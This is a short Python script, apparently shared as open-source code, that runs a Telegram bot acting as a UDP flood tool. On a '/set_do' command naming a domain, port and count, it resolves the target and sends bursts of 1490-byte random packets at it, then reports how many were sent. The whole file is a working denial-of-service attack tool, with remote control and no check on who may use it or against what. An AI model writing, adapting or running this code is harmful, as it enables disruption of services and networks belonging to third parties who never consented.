#!/usr/bin/env python3
"""
Copyright 2023 host1let

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
"""
import socket 
import random 
import uuid
import telebot

def randomBytes():
    return random._urandom(1490)

def uid():
    return uuid.uuid4().hex

def start(ip, port, for_):
    num = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(for_):
            sock.sendto(randomBytes(), (ip, port))
            num += 1
            print("sended {}".format(num))
    except Exception as e:
        return e
        pass

    finally:
        return num
    
tok = str(input("Enter Token > "))
app = telebot.TeleBot(tok)

@app.message_handler(content_types=['text'], chat_types=['private'])

def Main(msg):
    text = str(msg.text)
    
    if text.startswith('/set_do'):
#        app.reply_to(msg, text.)
        txt = text.replace('/set_do ', '')
#        app.reply_to(msg, domain)
        port = int(txt.split()[2])
        forx = str(txt.split()[-1])
        
        domain_ = socket.gethostbyname(str(txt.split()[0]))
        
        app.reply_to(msg, f'Domain: {domain_}\nPort: {port}\nIP: {domain_}')
        app.reply_to(msg, "Start Process ...")
        
        res = start(domain_, port, 1000 if forx == "" else int(forx))
        
        app.reply_to(msg, "Sended: {}".format(res))


app.infinity_polling()
